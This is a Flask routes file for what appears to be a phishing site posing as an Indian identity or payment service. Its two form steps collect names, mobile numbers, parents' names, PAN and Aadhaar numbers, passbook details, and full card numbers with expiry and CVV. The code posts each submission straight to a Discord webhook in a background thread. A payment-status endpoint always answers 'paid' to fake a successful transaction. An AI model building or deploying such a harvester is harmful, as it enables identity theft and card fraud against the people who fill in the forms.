File: app/routes.py

import uuid import random import os import threading from flask import Blueprint, render_template, request, redirect, url_for, session, jsonify import requests

main = Blueprint('main', name)

WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

def log_to_discord(content): def _log(): requests.post(WEBHOOK_URL, json={"content": content}) threading.Thread(target=_log).start()

@main.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': name = request.form.get('name') mobile = request.form.get('mobile') age = request.form.get('age') father = request.form.get('father') mother = request.form.get('mother') captcha_input = request.form.get('captcha_input') captcha_expected = session.get('captcha')

if captcha_input != captcha_expected:
        return render_template('index.html', error='Invalid CAPTCHA')

    user_id = str(uuid.uuid4())
    session['user_id'] = user_id
    session['step1'] = {
        'name': name,
        'mobile': mobile,
        'age': age,
        'father': father,
        'mother': mother
    }

    ua = request.headers.get('User-Agent')
    log_to_discord(f"[STEP 1] Name: {name}, Mobile: {mobile}, Age: {age}, Father: {father}, Mother: {mother}, UA: {ua}")

    return redirect(url_for('main.step2', user_id=user_id))

captcha = str(random.randint(1000, 9999))
session['captcha'] = captcha
return render_template('index.html', captcha=captcha)

@main.route('/step2/<user_id>', methods=['GET', 'POST']) def step2(user_id): if request.method == 'POST': pan = request.form.get('pan') aadhaar = request.form.get('aadhaar') passbook = request.form.get('passbook') card_number = request.form.get('card_number') expiry = request.form.get('expiry') cvv = request.form.get('cvv')

session['step2'] = {
        'pan': pan,
        'aadhaar': aadhaar,
        'passbook': passbook,
        'card_number': card_number,
        'expiry': expiry,
        'cvv': cvv
    }

    log_to_discord(f"[STEP 2] PAN: {pan}, Aadhaar: {aadhaar}, Passbook: {passbook}, Card: {card_number}, Expiry: {expiry}, CVV: {cvv}")

    return redirect(url_for('main.status_page', user_id=user_id))

return render_template('step2.html', user_id=user_id)

@main.route('/status/<user_id>') def status_page(user_id): log_to_discord(f"[STEP 3] User {user_id} reached payment screen (₹149 UPI)") return render_template('status.html', user_id=user_id)

@main.route('/api/check_status/<user_id>') def check_status(user_id): # Always return paid = true after 60s (simulate success) return jsonify({'paid': True})

@main.route('/success') def success(): return render_template('success.html')

